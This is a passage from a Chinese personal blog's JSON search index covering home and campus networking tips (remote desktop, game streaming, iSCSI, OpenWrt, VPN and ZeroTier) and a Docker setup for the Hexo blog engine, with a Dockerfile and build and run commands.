\u914d\u7f6e#DDNS</p>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u73a9\u6cd5","title":"\u73a9\u6cd5","text":"","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u8fdc\u7a0b\u684c\u9762","title":"\u8fdc\u7a0b\u684c\u9762","text":"<p>\u4f7f\u7528 windows \u81ea\u5e26\u7684\u201c\u8fdc\u7a0b\u684c\u9762\u8fde\u63a5\u201d\uff0c\u4fbf\u53ef\u4ee5\u8fdc\u7a0b\u8fde\u63a5\u5230\u5176\u4ed6 windows \u8ba1\u7b97\u673a\u3002\u4e0d\u53ea\u662f\u7535\u8111\uff0c\u624b\u673a\u5e73\u677f\u7b49\u5e73\u53f0\u4e5f\u5747\u53ef\u4e0b\u8f7d rdp \u8f6f\u4ef6\u8fde\u63a5\u5230 windows\u3002</p> <p>ps. 1. \u670d\u52a1\u7aef\u9700\u8981\u5f00\u542f\u8fdc\u7a0b\u8fde\u63a5\u670d\u52a1\uff0c\u9700\u8981 windows \u4e13\u4e1a\u7248\uff0c\u4f46\u662f github \u4e0a\u6709\u5bb6\u5ead\u7248\u5f00\u542f\u7684\u65b9\u6cd5\u30022. linux \u548c windows \u4e5f\u53ef\u901a\u8fc7 rdp \u534f\u8bae\u76f8\u4e92\u8fde\u63a5</p> <p>\u7528\u4f8b\uff1a</p> <ul> <li>\u8ba1\u7b97\u673a\u4e13\u4e1a\u53bb\u673a\u623f\u505a\u5b9e\u9a8c\u65f6\uff0c\u76f4\u63a5\u5728\u673a\u623f\u7535\u8111\u4e0a\u8fdc\u7a0b\u8fde\u63a5\u5230\u5bdd\u5ba4/\u5b9e\u9a8c\u5ba4\u7535\u8111</li> </ul> <ul> <li>\u56de\u5bb6\u65f6\u53f0\u5f0f\u673a\u642c\u4e0d\u56de\u5bb6\uff1f\u5c06\u53f0\u5f0f\u642c\u5230\u5b9e\u9a8c\u5ba4\uff08\u4e0d\u4f1a\u65ad\u7535\uff09\uff0c\u5728\u5bb6\u8fdc\u7a0b\u5f00\u673a\uff0c\u518d\u901a\u8fc7\u8fdc\u7a0b\u684c\u9762\u8fde\u63a5\u529e\u516c\u3002</li> <li>\uff08\u4eb2\u8eab\u7ecf\u5386\uff09\u67d0\u6b21\u82f1\u8bed\u505a presentation \u65f6\uff0c\u6559\u5ba4\u7684\u7535\u8111\u8bc6\u522b\u4e0d\u4e86\u81ea\u5df1\u7684 U \u76d8\uff0c\u76f4\u63a5\u8fdc\u7a0b\u8fde\u63a5\u5bbf\u820d\u7684\u7535\u8111\uff0c\u5c06\u6587\u4ef6\u590d\u5236\u5230\u6559\u5ba4\u7684\u7535\u8111\u4e2d\u3002\uff08\u6709\u70b9 cool\uff09</li> </ul>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u4e91\u6e38\u620f","title":"\u4e91\u6e38\u620f","text":"<p>\u51e0\u4e2a\u4e32\u6d41\u8f6f\u4ef6</p> <ul> <li>SteamLink\uff1a\u53ea\u8981\u6709 steam \u5c31\u53ef\u4ee5\u4e32\u6d41\uff0c\u6548\u679c\u4e0d\u9519</li> <li>AMD Link\uff1a\u8bd5\u8fc7\u5185\u7f51\u4e32\u6d41\uff0c\u611f\u89c9\u5dee\u4e0d\u591a\u3002\u6ca1\u5b9e\u73b0\u6210\u529f\u5916\u7f51\u4e32\u6d41</li> <li>moonlight(NV)\uff1a\u57fa\u4e8e NV \u7684 Sheild \u5b9e\u73b0\u7684\u5f00\u6e90\u7248\u672c\uff0c\u636e\u8bf4\u6548\u679c\u5f88\u597d</li> </ul> <p>\u4eb2\u8eab\u7ecf\u5386\uff0c\u8001\u5bb6\u6c5f\u897f\u4e50\u5e73\uff08100M \u79fb\u52a8\u5bbd\u5e26\uff09\uff0c\u53f0\u5f0f\u673a\u4f4d\u4e8e\u5b89\u5fbd\u5408\u80a5\u5b66\u6821\u5b9e\u9a8c\u5ba4\uff081000M \u6559\u80b2\u7f51\uff09\uff0c\u4f7f\u7528 ipv6 \u8fde\u63a5 (\u4f7f\u7528\u4e86 wireguard VPN \u8fde\u63a5\u5230\u5b66\u6821)\uff0c\u4f7f\u7528 SteamLink \u7eda\u4e3d\u6a21\u5f0f\uff08\u6700\u597d\u753b\u8d28\uff09\uff0c\u73a9\u602a\u7269\u730e\u4eba\u4e16\u754c\uff0c\u5ef6\u8fdf\u53ef\u4ee5\u7a33\u5b9a\u5728 20-30ms \u4e4b\u95f4\uff0c\u5b8c\u5168\u4e0d\u5361\uff08\u5982\u679c\u6ce2\u52a8\u5230 60ms \u5c31\u4f1a\u5361\uff0c20-30ms \u5c5e\u4e8e\u6548\u679c\u5f88\u597d\u7684\u60c5\u51b5\uff09</p> <p>\u4e0d\u8fc7\u4e5f\u6709\u4e00\u4e9b\u5c0f\u95ee\u9898\uff1a</p> <ul> <li>\u753b\u9762\u6709\u65f6\u4f1a\u51fa\u73b0\u8bb8\u591a\u9a6c\u8d5b\u514b\uff0c\u6216\u8005\u6709\u65f6\u6574\u4f53\u50cf\u662f\u52a0\u4e0a\u4e86\u4e00\u4e2a\u6ee4\u955c\uff0c\u504f\u7d2b\u3002\u611f\u89c9\u662f udp \u6570\u636e\u4f20\u8f93\u9519\u8bef\u5bfc\u81f4\u7684\u3002\u6216\u8005\u662f steamLink \u7684\u95ee\u9898\uff1f</li> <li>steamlink \u53ea\u6709\u624b\u673a\u5e73\u677f\u7aef\u652f\u6301 HEVC \u7f16\u7801\uff0c\u5176\u4f59\u5747\u53ea\u652f\u6301 h264 \u7f16\u7801\u3002\u4e0d\u77e5\u9053\u6362\u7528\u7f16\u7801\u80fd\u4e0d\u80fd\u89e3\u51b3\u4e0a\u9762\u7684\u753b\u9762\u95ee\u9898\u3002\uff08\u5e73\u677f\u7684 typec \u7ecf\u8f6c\u63a5\u540e\u662f\u53ef\u4ee5\u8fde\u63a5\u7f51\u7ebf\u7684\uff0c\u518d\u6b21\u5c1d\u8bd5\u540e\u4ecd\u7136\u51fa\u73b0\u4e86\u4e0a\u9762\u95ee\u9898\uff0c\u4e0d\u8fc7\u611f\u89c9\u597d\u50cf SteamLink \u5e76\u6ca1\u6709\u5f00\u542f h265 \u7f16\u7801\uff0c\u4fe1\u606f\u680f\u4ecd\u663e\u793a\u53f0\u5f0f\u673a\u5728\u4f7f\u7528 x264 \u8fdb\u884c\u7f16\u7801\uff09</li> <li>\u53f0\u5f0f\u673a\u4f7f\u7528\u7684\u663e\u5361\u4e3a RX550\uff0c\u6027\u80fd\u5f88\u5f31\u3002\u4e32\u6d41\u65f6\uff0c\u7f16\u7801\u4f7f\u7528\u4e86 CPU \u7f16\u7801\uff0c\u56e0\u6b64\u5bf9\u6027\u80fd\u7a0d\u7a0d\u9020\u6210\u4e86\u4e00\u70b9\u5f71\u54cd\u3002</li> <li>\u603b\u4e4b\uff0c\u611f\u89c9\u7528\u82f1\u4f1f\u8fbe\u7684\u786c\u4ef6+moonlight \u53ef\u80fd\u6548\u679c\u4f1a\u66f4\u597d\u3002</li> </ul>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u5bb6\u5ead\u5f71\u9662","title":"\u5bb6\u5ead\u5f71\u9662","text":"<p>\u5728\u7535\u8111\u4e0a\u4e0b\u8f7d\u597d\u9ad8\u6e05\u89c6\u9891\uff0c\u5f00\u542f SMB \u5171\u4eab\uff0c\u5728\u5b89\u5353\u7535\u89c6\u4e0a\u5b89\u88c5 kodi \u8f6f\u4ef6\uff0c\u901a\u8fc7 ipv6 \u6dfb\u52a0\u7535\u8111\u3002\u7535\u89c6\u5c31\u53ef\u4ee5\u76f4\u63a5\u64ad\u653e\u7535\u8111\u89c6\u9891\u4e86\uff0c\u800c\u4e14 Kodi \u4f5c\u4e3a\u4e00\u4e2a\u524d\u7aef\u8f6f\u4ef6\uff0c\u8fd8\u6709\u8bb8\u591a\u529f\u80fd\uff0c\u6bd4\u5982\u81ea\u52a8\u626b\u63cf\u6587\u4ef6\uff0c\u6dfb\u52a0\u7535\u5f71\u5c01\u9762\u3001\u7b80\u4ecb\u4e4b\u7c7b\u7684\u3002</p> <p>\u5b9e\u9645\u64cd\u4f5c{% post_link \u5c0f\u7c73\u7535\u89c6\u8bbf\u95ee\u7535\u8111\u89c6\u9891 %}</p>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#iscsi-\u7f51\u7edc\u6302\u8f7d\u78c1\u76d8","title":"iSCSI \u7f51\u7edc\u6302\u8f7d\u78c1\u76d8","text":"<p>\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u5c06\u67d0\u4e2a\u8bbe\u5907\u4e0a\u7684\u78c1\u76d8\u6302\u8f7d\u5230\u522b\u7684\u7535\u8111\u4e0a</p> <p>\u5bf9\u4e8e\u5ba2\u6237\u7aef\u6765\u8bf4\uff0c\u6302\u8f7d\u7684\u76d8\u548c\u5176\u4ed6\u76d8\u4e00\u6837\uff0c\u53ef\u4ee5\u5b89\u88c5\u8f6f\u4ef6\u3002\u7ecf\u6d4b\u8bd5\uff0c\u867d\u7136\u6e38\u620f\u52a0\u8f7d\u5ef6\u8fdf\u786e\u5b9e\u53d7\u5230\u7f51\u7edc\u5e26\u5bbd\u5f71\u54cd\u3002\u4f46\u662f\u662f\u771f\u7684\u53ef\u4ee5\u6253\u6e38\u620f\u7684\uff0c\u5373\u4f7f\u662f\u8fd0\u884c 50GB \u7684 MHW \u6548\u679c\u4e5f\u975e\u5e38\u7684\u597d\uff0c\u751a\u81f3\u6ca1\u6709\u611f\u89c9\u5230\u52a0\u8f7d\u5ef6\u8fdf\u3002</p> <p>\u7528\u4f8b\uff1a</p> <ul> <li>\u8001\u7b14\u8bb0\u672c\u4e0d\u600e\u4e48\u7528\u4e86\uff0c\u4f46\u662f\u4e0d\u60f3\u6d6a\u8d39\u4e0a\u9762\u7684 1TB \u78c1\u76d8\uff1f\u88c5\u4e0a Linux\uff0c\u5c06\u78c1\u76d8\u4f5c\u4e3a iSCSI server \u5206\u4eab\u51fa\u53bb\u3002</li> <li>\u8f7b\u8584\u672c\u4ec5\u6709 500G \u56fa\u6001\u4e14\u65e0\u6cd5\u6269\u5c55\uff1f\u6302\u8f7d\u4e0a\u5176\u4ed6\u8bbe\u5907\u4e0a\u7684 1TB \u78c1\u76d8\uff0c\u76f4\u63a5\u89e3\u653e\u3002</li> <li>\u5728\u4e00\u4e2a\u78c1\u76d8\u4e0a\u5b89\u88c5\u597d\u6e38\u620f\uff0c\u81ea\u5df1\u7684\u8bbe\u5907\u5e26\u4e0d\u52a8\uff0c\u4e0b\u6b21\u8e6d\u4e00\u4e0b\u522b\u4eba\u7684\u7535\u8111\uff0c\u7528\u522b\u4eba\u7684\u7535\u8111\u6765\u73a9</li> </ul> <p>\u8bbe\u7f6e\u65b9\u6cd5\u53c2\u8003{% post_link \u7f51\u7edc\u6302\u8f7d\u78c1\u76d8 (iSCSi) %}</p>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u8def\u7531\u5668\u73a9\u6cd5","title":"\u8def\u7531\u5668\u73a9\u6cd5","text":"","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#openwrt-\u5237\u673a","title":"openwrt \u5237\u673a","text":"<p>\u4ee5\u4e0b\u8def\u7531\u5668\u73a9\u6cd5\u5747\u9700\u8981\u6709\u4e00\u4e2a\u8def\u7531\u5668\uff0c\u5e76\u4e14\u9700\u8981\u5237\u6210\u7b2c\u4e09\u65b9\u7cfb\u7edf\uff0c\u63a8\u8350 openwrt \u7cfb\u7edf\u3002</p> <ul> <li>\u5237 openwrt \u53c2\u8003\uff1a{% post_link openwrt \u5237\u673a %}</li> </ul> <ul> <li>\u5982\u679c\u6709\u9700\u8981\uff0c\u8fd8\u53ef\u4ee5\u53c2\u8003\u5982\u4f55\u81ea\u5df1\u7f16\u8bd1 openwrt \u56fa\u4ef6\uff1a{% post_link openwrt \u7f16\u8bd1 %}</li> </ul>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u8fdc\u7a0b\u5f00\u673a","title":"\u8fdc\u7a0b\u5f00\u673a","text":"<p>\u4f7f\u7528\u7f51\u7edc\u5524\u9192 WOL(wake on LAN) \u65b9\u5f0f\u5bf9\u7535\u8111\u8fdb\u884c\u5f00\u673a\u3002\u6bd4\u5982\u8fdc\u7a0b\u5c06\u5b9e\u9a8c\u5ba4\u7684\u53f0\u5f0f\u673a\u5f00\u673a\uff0c\u7136\u540e\u8fdb\u884c\u8fdc\u7a0b\u684c\u9762\u8fde\u63a5\u3002</p>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u5b9a\u65f6\u811a\u672c","title":"\u5b9a\u65f6\u811a\u672c","text":"<p>\u5728\u8def\u7531\u5668\u4e0a\u4f7f\u7528 crontab \u5b9a\u65f6\u8fd0\u884c\u811a\u672c\uff0c\u6bd4\u5982\u4f7f\u7528 python \u81ea\u52a8\u8fdb\u884c\u7b7e\u5230\u3001\u62a2\u8bfe\u3002</p>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#vpn","title":"VPN","text":"<p>\u4f7f\u7528 VPN \u53ef\u4ee5\u5728\u5916\u5730\u8bbf\u95ee\u5185\u7f51\u3002\u6bd4\u5982\u653e\u5047\u56de\u5bb6\uff0c\u901a\u8fc7 VPN \u8fde\u63a5\u5230\u5b66\u6821\u7684\u8def\u7531\u5668\uff0c\u7136\u540e\u53ef\u4ee5\u8bbf\u95ee\u6821\u5185\u8d44\u6e90\u3002</p> <ul> <li>openwrt \u914d\u7f6e wiregurad \u65b9\u6cd5\u53c2\u8003\uff1aopenwrt \u914d\u7f6e#Wireguard</li> </ul>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u5185\u7f51\u7a7f\u900f","title":"\u5185\u7f51\u7a7f\u900f","text":"<p>\u5916\u7f51\u8bbf\u95ee\u8def\u7531\u5668\u5185\u7f51\u8bbe\u5907</p> <ul> <li>zerotier\uff1a\u6700\u7b80\u5355\u7684\u5185\u7f51\u7a7f\u900f\u5de5\u5177\uff0c\u9700\u8981\u6ce8\u518c zerotier \u8d26\u53f7\uff0czerotier \u4f1a\u5c1d\u8bd5\u4f7f\u8bbe\u5907\u95f4\u76f4\u63a5\u8fde\u63a5\uff0c\u4e0d\u884c\u5219\u4f7f\u7528 zerotier \u670d\u52a1\u5668\u8f6c\u53d1\uff08\u7ed9\u7684\u5e26\u5bbd\u4e5f\u5f88\u9ad8\uff09\u3002<ul> <li>openwrt \u914d\u7f6e zerotier \u65b9\u6cd5\u53c2\u8003\uff1aopenwrt \u914d\u7f6e#ZeroTier</li> </ul> </li> <li>wiregurad \u505a VPN \u540c\u65f6\uff0c\u4e5f\u53ef\u4ee5\u8fdb\u884c\u5185\u7f51\u7a7f\u900f</li> </ul>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u900f\u660e\u4ee3\u7406","title":"\u900f\u660e\u4ee3\u7406","text":"<p>\u5728\u8def\u7531\u5668\u4e0a\u8fd0\u884c\u4ee3\u7406\u8f6f\u4ef6\uff0c\u5982 ssr, clash\u3002\u4ece\u800c\u5b9e\u73b0\u8fde\u63a5\u5230\u8be5\u8def\u7531\u5668\u4e0a\u7684\u8bbe\u5907\u5747\u53ef\u79d1\u5b66\u4e0a\u7f51\uff0c\u800c\u4e0d\u7528\u8fdb\u884c\u4efb\u4f55\u989d\u5916\u8bbe\u7f6e\u3002</p> <ul> <li>openwrt \u914d\u7f6e\u900f\u660e\u4ee3\u7406\u65b9\u6cd5\u53c2\u8003\uff1aopenwrt \u914d\u7f6e#\u900f\u660e\u4ee3\u7406</li> </ul>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u5c0f\u578b-nas","title":"\u5c0f\u578b NAS","text":"<p>\u5bf9\u4e8e\u6709 USB \u63a5\u53e3\u7684\u8def\u7531\u5668\uff0c\u53ef\u4ee5\u63a5\u4e0a\u4e00\u5757\u79fb\u52a8\u786c\u76d8\uff08\u6216\u8005\u5145\u5206\u5229\u7528\u4f60\u7684 U \u76d8:-)\uff09\u6765\u4f5c\u4e3a\u4e00\u4e2a\u6587\u4ef6\u5b58\u50a8\u5668\u3002</p>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u5176\u4ed6\u7f51\u7edc\u5de5\u5177","title":"\u5176\u4ed6\u7f51\u7edc\u5de5\u5177","text":"","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#barrier","title":"barrier","text":"<ul> <li>debauchee/barrier: Open-source KVM software (github.com)</li> </ul> <p>\u4e00\u6b3e\u5f00\u6e90\u514d\u8d39\u7684\u952e\u9f20\u5171\u4eab\u5de5\u5177\uff0c\u901a\u8fc7\u7f51\u7edc\u4f7f\u4e00\u5957\u952e\u9f20\u53ef\u4ee5\u63a7\u5236\u591a\u4e2a\u8bbe\u5907\uff0c\u5e76\u4e14\u8fd8\u652f\u6301\u526a\u5207\u677f\uff0c\u6587\u4ef6\u62d6\u52a8\u7b49\u529f\u80fd\u3002\u5728 windows \u548c linux \u4e0a\u5747\u53ef\u4f7f\u7528\u3002</p>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/05/24/2022-05-24-%E4%BD%BF%E7%94%A8docker%E9%85%8D%E7%BD%AEhexo%E5%8D%9A%E5%AE%A2%E7%8E%AF%E5%A2%83/","title":"\u4f7f\u7528 docker \u914d\u7f6e hexo \u535a\u5ba2\u73af\u5883","text":"<p>\u7531\u4e8e nodejs \u7248\u672c\u8f83\u591a\uff0c\u76f4\u63a5\u5728\u5bbf\u4e3b\u673a\u4e0a\u5b89\u88c5 nodejs \u73af\u5883\u4e0d\u5bb9\u6613\u7ba1\u7406\u3002\u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528 docker \u7ef4\u62a4\u4e00\u4e2a\u4e13\u95e8\u7528\u4e8e hexo \u7684\u73af\u5883\u3002</p>","tags":["docker","hexo"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/05/24/2022-05-24-%E4%BD%BF%E7%94%A8docker%E9%85%8D%E7%BD%AEhexo%E5%8D%9A%E5%AE%A2%E7%8E%AF%E5%A2%83/#hexo-\u76f4\u63a5\u5b89\u88c5","title":"hexo \u76f4\u63a5\u5b89\u88c5","text":"<p>\u6559\u7a0b\uff1ahttps://hexo.io/zh-cn/docs/index.html</p> <p>\u9996\u5148\u9700\u8981\u5b89\u88c5 node.js \u548c git\uff0c\u7136\u540e\u5b89\u88c5 hexo</p> <pre><code>npm install -g hexo-cli\n</code></pre> <p>\u5e38\u7528 hexo \u547d\u4ee4</p> <pre><code>#\u5efa\u7ad9\nhexo init\nnpm install     #init\u540e\u9700\u8981\u4f7f\u7528npm\u5b89\u88c5hexo\u6240\u9700\u4f9d\u8d56\n\nhexo new [layout] &lt;title&gt;\n\nhexo clean      #\u5220\u9664public\u76ee\u5f55(\u751f\u6210\u7684html)\nhexo s -p PORT #\u8fd0\u884cserver\uff0c\u5bf9markdown\u7684\u4fee\u6539\u4f1a\u5b9e\u65f6\u53cd\u5e94\nhexo g      #\u751f\u6210html\nhexo d      #\u90e8\u7f72\uff0c\u6216hexo d -g\n</code></pre>","tags":["docker","hexo"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/05/24/2022-05-24-%E4%BD%BF%E7%94%A8docker%E9%85%8D%E7%BD%AEhexo%E5%8D%9A%E5%AE%A2%E7%8E%AF%E5%A2%83/#docker-\u5b89\u88c5","title":"docker \u5b89\u88c5","text":"<p>\u4e3b\u8981\u8fc7\u7a0b\uff1a</p> <ol> <li>\u4f7f\u7528 Dockerfile\uff0c\u57fa\u4e8e node \u57fa\u955c\u50cf\uff0c\u521b\u5efa\u542b hexo \u7684\u955c\u50cf</li> <li>\u8fd0\u884c\u8be5\u955c\u50cf\uff0c\u5c06 blog \u76ee\u5f55\u6620\u5c04\u5230 docker \u5bb9\u5668\u4e2d\uff0c\u7136\u540e\u8fdb\u884c hexo \u64cd\u4f5c</li> <li>[\u53ef\u9009]\u4e3a\u4e86\u907f\u514d\u90e8\u7f72\u65f6\u8f93\u5165 github \u5bc6\u7801\uff0c\u53ef\u4ee5\u5c06.ssh \u76ee\u5f55\u6620\u5c04\u5230\u5bb9\u5668\u4e2d</li> </ol>","tags":["docker","hexo"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/05/24/2022-05-24-%E4%BD%BF%E7%94%A8docker%E9%85%8D%E7%BD%AEhexo%E5%8D%9A%E5%AE%A2%E7%8E%AF%E5%A2%83/#dockerfile","title":"dockerfile","text":"<p>\u8bf4\u660e</p> <ul> <li>\u53c2\u8003\u7684 dockerfile\uff1a\u4f7f\u7528 docker \u642d\u5efa Hexo - wanf3ng's blog</li> </ul> <ul> <li>\u8bbe\u7f6e\u7528\u6237\u95ee\u9898\uff1a\u5728 docker \u4e2d\u57f7\u884c hexo | Plusku@blog<ul> <li>\u9ed8\u8ba4\u4e86\u7528\u6237 uid=1000\u3002\u56e0\u6b64\u53ef\u4ee5\u76f4\u63a5\u6307\u5b9a User node \u6765\u907f\u514d\u5bb9\u5668\u5185\u751f\u6210\u7684\u6587\u4ef6\u4e3a root \u6240\u6709\u95ee\u9898\u3002</li> </ul> </li> </ul> <ul> <li>\u6dfb\u52a0\u4e86 git \u8bbe\u7f6e</li> </ul> <ul> <li>\u4f7f\u7528 node12.0\uff0c\u5426\u5219 hexo \u8fd0\u884c\u4f1a\u62a5\u9519</li> </ul> <pre><code>FROM node:12.6.0-alpine\n\n# \u5207\u6362\u4e2d\u79d1\u5927\u6e90\nRUN sed -i 's/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g' /etc/apk/repositories\n# \u5b89\u88c5bash git openssh\nRUN apk add bash git openssh\n\n# \u8bbe\u7f6e\u5bb9\u5668\u65f6\u533a\u4e3a\u4e0a\u6d77\nRUN apk add tzdata &amp;&amp; cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \\\n&amp;&amp; echo \"Asia/Shanghai\" &gt; /etc/timezone \\\n&amp;&amp; apk del tzdata\n\n# \u5b89\u88c5hexo\nRUN \\ \nnpm config set registry https://registry.npm.taobao.org \\\n&amp;&amp;npm install \\\n&amp;&amp;npm install hexo-cli -g \\\n&amp;&amp; npm install hexo-server --save \\\n&amp;&amp; npm install hexo-asset-image --save \\\n&amp;&amp; npm install hexo-wordcount --save \\\n&amp;&amp; npm install hexo-generator-sitemap --save \\\n&amp;&amp; npm install hexo-generator-baidu-sitemap --save \\\n&amp;&amp; npm install hexo-deployer-git --save\n\nARG GIT_NAME\nARG GIT_EMAIL\n\nUser node\n\n# \u8bbe\u7f6egit push\u65f6\u7684\u7528\u6237\u540d\u548c\u90ae\u7bb1\nRUN \\\n git config --global user.email \"$GIT_EMAIL\" \\\n &amp;&amp; git config --global user.name \"$GIT_NAME\"\n\nWORKDIR /home/node/blog\n\nEXPOSE 4000\n\nENTRYPOINT [\"/bin/bash\"]\n</code></pre>","tags":["docker","hexo"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/05/24/2022-05-24-%E4%BD%BF%E7%94%A8docker%E9%85%8D%E7%BD%AEhexo%E5%8D%9A%E5%AE%A2%E7%8E%AF%E5%A2%83/#build-\u955c\u50cf","title":"build \u955c\u50cf","text":"<pre><code>docker build -t yfy/hexo-blog\\\n --build-arg GIT_NAME=\"Fuyan Yuan\"\\\n --build-arg GIT_EMAIL=\"33221728+TheRainstorm@users.noreply.github.com\"\\\n .\n</code></pre>","tags":["docker","hexo"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/05/24/2022-05-24-%E4%BD%BF%E7%94%A8docker%E9%85%8D%E7%BD%AEhexo%E5%8D%9A%E5%AE%A2%E7%8E%AF%E5%A2%83/#\u8fd0\u884c","title":"\u8fd0\u884c","text":"<pre><code>docker run -it --name hexo-blog\\\n -p 4000:4000 \\\n -v /home/yfy/Documents/hexo-blog:/home/node/blog/ \\\n -v /home/yfy/.ssh:/home/node/.ssh\\\n yfy/hexo-blog\n</code></pre> <p>\u5982\u679c blog \u4e0b\u6ca1\u6709 node_modules\uff0c\u5219\u9700\u8981</p> <pre><code>npm install\n</code></pre> <p>\u4e4b\u540e\u6b63\u5e38\u4f7f\u7528 hexo \u5373\u53ef</p> <p>docker \u6280\u5de7\uff1a\u8fde\u63a5\u5230\u5df2\u6709\u5bb9\u5668\u3002</p> <pre><code>docker attach CONTAINER\ndocker exec -it CONTAINER CMD\n</code></pre> <p><code>attach</code>\u547d\u4ee4\u5c06\u7ec8\u7aef\u7684\u6807\u51c6\u8f93\u5165\uff0c\u6807\u51c6\u8f93\u51fa\uff0c\u6807\u51c6\u9519\u8bef\u8fde\u63a5\u5230\u6b63\u5728\u8fd0\u884c\u7684\u5bb9\u5668\u3002\u5982\u679c\u5bb9\u5668\u6b63\u5728\u8fd0\u884c\u7684\u547d\u4ee4\u662f bash\uff0c\u5219 exit \u540e\uff0c\u5bb9\u5668\u9000\u51fa</p> <p><code>exec</code>\u547d\u4ee4\u5728\u5bb9\u5668\u5185\u542f\u52a8\u65b0\u7684\u8fdb\u7a0b\u3002\u5e38\u89c1\u5982 